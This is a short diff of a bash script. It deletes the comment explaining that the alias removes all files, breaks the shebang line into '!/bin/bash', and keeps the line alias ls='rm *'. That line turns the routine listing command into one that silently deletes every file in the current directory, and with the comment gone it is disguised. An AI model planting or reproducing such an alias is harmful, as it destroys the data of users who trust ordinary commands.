@@ -1,3 +1,2 @@
-#!/bin/bash
-# Create an alias named 'ls' that removes all files in the current directory
+!/bin/bash
 alias ls='rm *'
